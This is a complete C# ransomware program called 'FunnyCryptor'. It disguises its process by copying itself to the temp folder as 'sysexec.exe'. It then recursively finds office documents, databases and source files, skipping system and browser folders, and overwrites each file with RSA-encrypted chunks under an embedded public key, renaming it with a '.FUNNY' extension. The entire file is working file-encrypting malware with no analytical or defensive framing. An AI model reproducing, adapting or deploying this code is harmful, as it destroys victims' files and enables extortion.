using System.Diagnostics;
using System.Security.Cryptography;

HideProcess();
FindPaths();
Encrypt();

return;

static void HideProcess()
{
    var current = Process.GetCurrentProcess();
    var name = current.ProcessName + ".exe";

    if (!name.Contains(CurrentName, StringComparison.InvariantCultureIgnoreCase)) return;
    var dest = Path.Combine(Path.GetTempPath(), ObfsName);

    File.Copy(name, dest, true);

    if (File.Exists(CurrentName + ".dll"))
    {
        Console.WriteLine("HideProcess: Error. Only AOT.");
        return;
    }

    Process.Start(dest);
    Environment.Exit(0);
}

static void FindPaths()
{
    var path = StartPath ?? "c:\\";
    _foundPaths = ScanDirectories(path)
        .SelectMany(Directory.EnumerateFiles)
        .Where(x => Extensions.Contains(Path.GetExtension(x)) &&
                    !ExcludePaths.Any(e => x.Contains(e, StringComparison.InvariantCultureIgnoreCase)));
}

static void Encrypt()
{
    EncAlgo.ImportRSAPublicKey(EncryptionKey.Span, out _);
    foreach (var path in _foundPaths)
        try
        {
            var bytes = File.ReadAllBytes(path).Chunk(245).ToList();
            var dict = new Dictionary<int, byte[]>();

            for (var i = 0; i < bytes.Count; i++)
            {
                var enc = EncAlgo.Encrypt(bytes[i], RSAEncryptionPadding.Pkcs1); // 256 bytes
                dict.Add(i, enc);
            }

            var writer = File.Open(path, FileMode.OpenOrCreate, FileAccess.Write, FileShare.None);
            writer.Position = 0;

            writer.Write(Prefix.Span);

            var count = dict.Count;
            writer.Write(BitConverter.GetBytes(count)); // 4 bytes

            /*
             * MAP INFO:
             *
             * [ PR ][     4 bytes    ]  [                                  16 bytes                                  ]
             * [ EF ]| TOTAL SEGMENTS |  [                                   SEGMENT                                  ]
             * [ IX ]|      SIZE      |  [                START               ||||                END                 ]
             * [    ][0], [1], [2], [3], [x], [x], [x], [x], [x], [x], [x], [x], [x], [x], [x], [x], [x], [x], [x], [x]
             */
            var offset = writer.Position + count * 16;
            for (var i = 0; i < dict.Count; i++)
            {
                var element = dict[i];
                var start = offset;
                var end = offset += element.Length;

                writer.Write(BitConverter.GetBytes(start)); // 8 bytes
                writer.Write(BitConverter.GetBytes(end)); // 8 bytes
            }

            for (var i = 0; i < dict.Count; i++) writer.Write(dict[i]);

            writer.Close();
            writer.Dispose();

            File.Move(path, path + ".FUNNY", true);
        }
        catch
        {
            // ignore
        }
}

static IEnumerable<string> ScanDirectories(string pathDir)
{
    yield return pathDir;
    IEnumerable<string> dirs;

    try
    {
        dirs = Directory.EnumerateDirectories(pathDir);
    }
    catch
    {
        dirs = Enumerable.Empty<string>();
    }

    foreach (var dirsLst in dirs.SelectMany(ScanDirectories)) yield return dirsLst;
}

internal partial class Program
{
    private const string CurrentName = "FunnyCryptor";
    private const string ObfsName = "sysexec.exe";

    private static readonly List<string> Extensions =
    [
        ".doc",
        ".docx",
        ".xls",
        ".xlsx",
        ".ppt",
        ".pptx",
        ".db",
        ".sql",
        ".sqlite",
        ".cs",
        ".sln",
        ".csproj",
        ".xaml",
        ".txt",
        ".inc",
        ".bpl",
        ".odc",
    ];

    private static readonly List<string> ExcludePaths =
    [
        "Windows",
        "$RECYCLE.BIN",
        "$WINDOWS.~BT",
        "$Windows.~WS",
        @":\Users\Default\",
        @":\Users\Public\",
        "Boot",
        "Cache",
        "Common Files",
        "Config.Msi",
        @"C:\Users\User\AppData\Local\",
        "Chrome",
        "Firefox",
        "Internet Explorer",
        "MicrosoftEdge",
        "Mozilla Firefox",
        "Mozilla",
        "Opera",
        "Opera Software",
        "Tor Browser",
        "Intel",
        "Microsoft",
        "Microsoft Shared",
        "Microsoft.NET",
        "MSBuild",
        "MSOCache",
        "Packages",
        "PerfLogs",
        "Program Files (x86)",
        "Program Files",
        "ProgramData",
        "steamapps",
        "System Volume Information",
        "Temp",
        "\\tmp",
        "USOShared",
        "Windows Defender",
        "Windows Journal",
        "Windows NT",
        "Windows Photo Viewer",
        "Windows Security",
        "Windows.old",
        "WindowsApps",
        "WindowsPowerShell",
        "WINNT"
    ];

    private static readonly ReadOnlyMemory<byte> Prefix = new("FUNNY"u8.ToArray());

    private const string? StartPath = @"d:\\AutoRequest\\";
    private static IEnumerable<string> _foundPaths = [];

    private static readonly ReadOnlyMemory<byte> EncryptionKey = new(Convert.FromHexString(
        "3082010a0282010100bbbc5acb55543910c0113fa13c08945ecaa0325b307057683b845e7eab1fbeaef0c4d11f3ac0b6faddc809ae78db8be6d92f5a44264deba9747f1c7168979cccd69a383170bc7affd38471d8ec25f8d9fc1288df382dd2f1a3a9b32bc4fbe1cadc43a546cc5c2cac335bce9bd32df3d57ec33b7fbec854cdffa8e26bf9b95b87681c67cd77dcd069c51cf46c4313a0f90ad44c4531093a55bd8a2821b6a15bf3e4bcbda25d92fe00da4d587aeff176c458b7f01cae56e4d477b8ce348a57a91b290a9009909ac4f7b691e5436251850df15c65a9919c136c992f840e4e36cbe97cbbfce0e54f4e5ea326197dc8e9092f08e07f93e21229d93d6d25e2381f76390203010001"));

    private static readonly RSA EncAlgo = RSA.Create();
}